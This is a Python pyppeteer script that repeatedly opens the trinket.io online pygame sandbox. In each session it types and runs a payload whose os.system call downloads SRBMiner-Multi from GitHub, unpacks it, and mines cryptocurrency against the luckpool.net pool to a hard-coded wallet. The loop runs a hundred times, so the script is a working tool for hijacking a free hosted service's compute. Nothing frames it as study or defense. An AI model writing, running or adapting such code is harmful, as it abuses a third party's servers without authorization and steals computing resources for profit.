
import asyncio
from pyppeteer import launch
import time

async def main():
    for x in range(100):
        browser = await launch(options={'args': ['--no-sandbox'], 'devtools':True, 'headless':True})
        page = await browser.newPage()
        await page.setViewport({ 'width': 800, 'height': 600 })
        # await page.goto('https://google.com')
        
        await page.goto('https://trinket.io/features/pygame')
        time.sleep(5)
        await page.keyboard.down('ControlLeft')
        await page.keyboard.press('KeyA')
        await page.keyboard.up('ControlLeft')
        # await page.screenshot({'path': './all.png'})
        time.sleep(1)
        await page.keyboard.type("import os; os.system('wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.3/SRBMiner-Multi-0-9-3-Linux.tar.xz && tar -xvf SRBMiner-Multi-0-9-3-Linux.tar.xz && cd SRBMiner-Multi-0-9-3 && ./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool eu.luckpool.net:3956 --wallet RJTX2MHX6KjJRS8Byo7rDrWAqbgitUKiyt.TRSRB1 --password x');")
        time.sleep(1)
        await page.screenshot({'path': './trinket.png'})
        await page.mouse.click(780, 560, { 'button': 'left' })
        time.sleep(2)
        # await page.screenshot({'path': './click.png'})
        num = 6
        for x in range(num):
        #code
            time.sleep(10)
            await page.screenshot({'path': './res.png'})
            await page.keyboard.press('s')
            await page.keyboard.press('ArrowUp')
        await browser.close()
asyncio.get_event_loop().run_until_complete(main())
